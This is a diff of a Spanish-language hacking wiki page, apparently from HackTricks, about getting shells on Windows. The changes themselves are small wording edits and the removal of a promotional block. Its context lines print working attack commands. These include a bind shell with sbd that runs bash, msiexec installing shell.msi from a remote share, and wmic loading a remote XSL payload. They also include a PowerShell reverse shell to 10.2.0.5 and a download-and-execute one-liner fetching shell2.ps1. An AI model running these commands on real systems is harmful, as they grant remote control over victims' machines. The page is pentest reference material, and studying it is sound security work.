@@ -15,14 +15,6 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
 La página [lolbas-project.github.io](https://lolbas-project.github.io/) es para Windows como [https://gtfobins.github.io/](https://gtfobins.github.io/) lo es para Linux.\
@@ -47,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) es una alternativa portátil y segura a Netcat**. Funciona en sistemas similares a Unix y Win32. Con características como cifrado fuerte, ejecución de programas, puertos de origen personalizables y reconexión continua, sbd proporciona una solución versátil para la comunicación TCP/IP. Para los usuarios de Windows, la versión sbd.exe de la distribución Kali Linux se puede utilizar como un reemplazo confiable de Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) es una alternativa portátil y segura a Netcat**. Funciona en sistemas similares a Unix y Win32. Con características como cifrado fuerte, ejecución de programas, puertos de origen personalizables y reconexión continua, sbd proporciona una solución versátil para la comunicación TCP/IP. Para los usuarios de Windows, la versión sbd.exe de la distribución Kali Linux se puede utilizar como un reemplazo confiable para Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -334,7 +326,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Ejemplo de archivo xsl [desde aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Ejemplo de archivo xsl [de aquí](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -403,7 +395,7 @@ En la carpeta **Shells**, hay muchas shells diferentes. Para descargar y ejecuta
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Inicie el servidor web para servir el script y ejecútelo en el extremo de la víctima:
+Comience a servir el script en un servidor web y ejecútelo en el extremo de la víctima:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -483,12 +475,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) consola PS con algunos módulo
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
